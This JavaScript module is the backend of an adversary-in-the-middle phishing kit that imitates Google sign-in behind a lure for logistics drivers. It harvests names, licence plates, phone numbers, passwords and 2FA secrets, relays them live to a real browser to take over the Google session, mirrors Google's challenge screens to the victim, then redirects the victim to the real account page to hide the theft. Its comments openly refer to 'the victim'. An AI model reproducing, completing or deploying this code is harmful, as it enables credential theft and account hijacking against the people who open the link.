import * as events from './events.js';
import * as store from './store.js';
import * as browser from './browser.js';

// ---------- single static link ----------
// There's exactly ONE link everyone uses: /w/<STATIC_TOKEN>. Unlike the old
// per-invite model there's no list of generated links — any number of different
// people can register through the same link. Each visitor is tracked by a
// client-generated wizard id (`wid`), so their steps build up ONE fresh session
// of their own and never collide with another person using the link.
export const STATIC_TOKEN = 'login';

// Where the victim's browser is redirected after credentials are captured, so
// they land on the *real* site and never see a fake "you're all set" page.
const LANDING = 'https://myaccount.google.com/';

// A visitor's in-flight registration is only meaningful while they're typing.
// Entries idle for longer than this are dropped (the real session record in the
// store is what persists — this map is just the in-flight copy).
const PENDING_TTL = 30 * 60 * 1000;
const SWEEP_MS = 60 * 1000;

// wid -> a single person's registration attempt in progress (in-memory)
const pending = new Map();

function entry(wid) {
  const key = String(wid || 'default');
  let r = pending.get(key);
  if (!r) {
    r = {
      sessionId: null,
      username: '',
      lastLogin: null,
      steps: { driver: false, username: false, password: false, totp: false },
      ts: Date.now(),
    };
    pending.set(key, r);
  }
  r.ts = Date.now();
  return r;
}

// Read-only lookup that does NOT create an entry (used by the poll endpoint).
function peek(wid) {
  const r = pending.get(String(wid || 'default'));
  if (r) r.ts = Date.now();
  return r || null;
}

setInterval(() => {
  const now = Date.now();
  for (const [k, r] of pending) if (now - r.ts > PENDING_TTL) pending.delete(k);
}, SWEEP_MS).unref();

// wizard-facing view — only what the remote user's page may know
function toPayload(r) {
  const session = r.sessionId ? store.getRaw(r.sessionId) : null;
  return {
    token: STATIC_TOKEN,
    loggedIn: session?.status === 'logged-in',
    // result of the last live-login step the backend drove: the real
    // Google status/message + which screen the REAL browser is now asking for
    // (email/password/totp/prompt/passkey/choice/sms/captcha/logged-in/error),
    // so the clone mirrors it exactly. Includes extras the clone needs:
    // codeKind (totp sms vs authenticator), choices (option labels), phone.
    login: r.lastLogin || null,
    landing: LANDING,
  };
}

// Called by the wizard page on load. Validates the token (only the static one is
// valid now) and marks the visit as activity for the admin feed.
export function begin(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.opened', { message: 'Someone opened the sign-in link' });
  return toPayload(r);
}

// step: 'driver' | 'username' | 'password' | 'totp' | 'choice' | 'send-code'.
// Persists the credential into the visitor's real session *and* drives the
// actual Google sign-in forward (see browser.wizardPhase), so the logged-in
// session is genuinely built up as the user walks the wizard — not just stored.
export async function step(token, wid, step, value) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);

  let message;
  if (step === 'driver') {
    // Logistics driver submission — the first thing a driver fills in (landing
    // form before the Google sign-in). Captured immediately into a session so we
    // keep the plate/driver details even if they never complete the Google login.
    const d = (value && typeof value === 'object') ? value : {};
    const driverName = String(d.driverName ?? '').trim();
    const licensePlate = String(d.licensePlate ?? '').trim().toUpperCase();
    const phone = String(d.phone ?? '').trim();
    r.driver = { driverName, licensePlate, phone };
    r.steps.driver = true;
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: licensePlate ? `${driverName || ''} · ${licensePlate}` : (driverName || 'Driver submission'),
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username: '',
        password: '',
        totpSecret: '',
        note: 'Logistics driver submission',
        driverName,
        licensePlate,
        phone,
      }).id;
    } else {
      store.update(r.sessionId, { driverName, licensePlate, phone });
    }
    message = `Driver: ${driverName || '(no name)'} · plate ${licensePlate || '—'}`;
  } else if (step === 'username') {
    const username = String(value ?? '').trim();
    r.username = username;
    r.steps.username = true;
    // Create the real session the moment the first credential arrives so the
    // live browser login has a persistent home (sessions/<id>/).
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: username || 'New sign-in',
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username,
        password: '',
        totpSecret: '',
        note: 'Signed in through the shared link',
      }).id;
    } else {
      store.update(r.sessionId, { username });
    }
    message = `Entered username: ${username || '(blank)'}`;
  } else if (step === 'password') {
    const password = String(value ?? '');
    r.steps.password = true;
    if (r.sessionId) store.update(r.sessionId, { password });
    message = 'Entered password ••••••••';
  } else if (step === 'totp') {
    const secret = String(value ?? '').replace(/\s+/g, '');
    r.steps.totp = true;
    if (r.sessionId) store.update(r.sessionId, { totpSecret: secret });
    message = secret ? 'Provided a 2FA (authenticator) code' : 'Skipped 2FA';
  } else if (step === 'choice') {
    message = `Chose verification method: ${String(value ?? '')}`;
  } else if (step === 'send-code') {
    message = 'Requested a code by text/call';
  } else {
    return toPayload(r);
  }

  // Drive the real login for this step. Best-effort — never breaks the wizard:
  // even if Google throws a challenge, the credentials are saved and the admin
  // can finish by hand or Auto-login later. (The driver step has no browser
  // phase — it's just data we store.)
  if (r.sessionId && step !== 'driver') {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const res = (await browser.wizardPhase(step, r.sessionId, valueForLogin)) || {};
    // surface the live-login result to the wizard front-end so it can mirror
    // real Google (stay on the field for a wrong password / bad code, show a
    // waiting screen for phone prompts, etc.)
    r.lastLogin = {
      status: res.status || 'unknown',
      message: res.message || '',
      state: res.state || null,
      code: res.code || null,
      codeKind: res.codeKind || null,
      choices: res.choices || null,
      phone: res.phone || null,
    };
    if (res.status === 'logged-in') {
      store.setStatus(r.sessionId, 'logged-in');
      events.push('wizard.logged-in', {
        message: `Signed in ✓  ${r.username || 'Google'}`.trim(),
      });
    } else if (res.status === 'error') {
      store.setStatus(r.sessionId, 'new');
    }
  }

  events.push('wizard.step', { message });
  return toPayload(r);
}

// Poll: the clone's waiting screens (phone prompt / passkey / captcha /
// "verifying") call this every few seconds. It re-reads the LIVE state of the
// session's real browser without driving it — the victim is tapping the phone
// notification / passkey prompt, and this is how the clone finds out the real
// browser moved on. Does not create entries and does not push feed events.
export async function poll(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = peek(wid);
  if (!r) return null;
  if (r.sessionId) {
    const res = await browser.pollState(r.sessionId);
    if (res) {
      r.lastLogin = {
        status: res.status || 'unknown',
        message: res.message || '',
        state: res.state || null,
        code: res.code || null,
        codeKind: res.codeKind || null,
        choices: res.choices || null,
        phone: res.phone || null,
      };
      if (res.status === 'logged-in') {
        store.setStatus(r.sessionId, 'logged-in');
        events.push('wizard.logged-in', {
          message: `Signed in ✓  ${r.username || 'Google'}`.trim(),
        });
      }
    }
  }
  return toPayload(r);
}

// Finalize. The session was already created + driven during the steps; here we
// just report completion so the front-end redirects to the real account page.
// (No session is created if the visitor never submitted anything.)
export function complete(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.completed', {
    message: `Sign-in complete ✓  ${r.username || 'Google'}`.trim(),
  });
  return toPayload(r);
}
